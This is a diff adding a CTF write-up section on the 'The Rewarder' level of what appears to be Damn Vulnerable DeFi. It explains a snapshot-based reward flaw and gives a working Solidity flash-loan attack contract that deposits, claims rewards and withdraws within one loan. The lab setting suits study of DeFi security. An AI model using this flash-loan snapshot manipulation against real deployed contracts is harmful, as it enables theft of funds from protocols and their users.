@@ -62,4 +62,40 @@ function execute()external payable{
         pool.deposit{value: msg.value}();
     }
 ```
+## 5. The Rewarder
+The vulnerability lies in the mechanism of distributing rewards in `TheRewarderPool` contract. Specifically, the distribution of rewards depends on a single snapshot in time rather than continuous or aggregated data points. This makes the system susceptible to manipulation through flash loans.
+```solidity
+ function distributeRewards() public returns (uint256 rewards) {
+        if (isNewRewardsRound()) {
+            _recordSnapshot();
+        }
 
+        uint256 totalDeposits = accountingToken.totalSupplyAt(lastSnapshotIdForRewards);
+        uint256 amountDeposited = accountingToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);
+
+        if (amountDeposited > 0 && totalDeposits > 0) {
+            rewards = amountDeposited.mulDiv(REWARDS, totalDeposits);
+            if (rewards > 0 && !_hasRetrievedReward(msg.sender)) {
+                rewardToken.mint(msg.sender, rewards);
+                lastRewardTimestamps[msg.sender] = uint64(block.timestamp);
+            }
+        }
+    }
+```
+### Solution
+We utilize the `skip function` in Foundry to bypass the 5-day cooldown period, allowing us to do the attack process.
+To exploit this vulnerability, we aim to claim the most rewards in the upcoming round by manipulating the snapshot mechanism. By taking a significant flash loan and approving and than depositing liquidity, we can create a snapshot of the current balances state. After that, we can withdraw the deposited tokens and transfer them to `TheFlashLoanerPool` to complete the flash loan.
+```solidity
+ function attack()external{
+        flashPool.flashLoan(liquidityToken.balanceOf(address(flashPool)));
+    }
+
+    function receiveFlashLoan(uint256 amount)external{
+        liquidityToken.approve(address(rewarderPool), amount);
+        rewarderPool.deposit(amount);
+        rewarderPool.distributeRewards();
+        rewarderPool.withdraw(amount);
+
+        liquidityToken.transfer(address(flashPool), amount);
+    }
+```
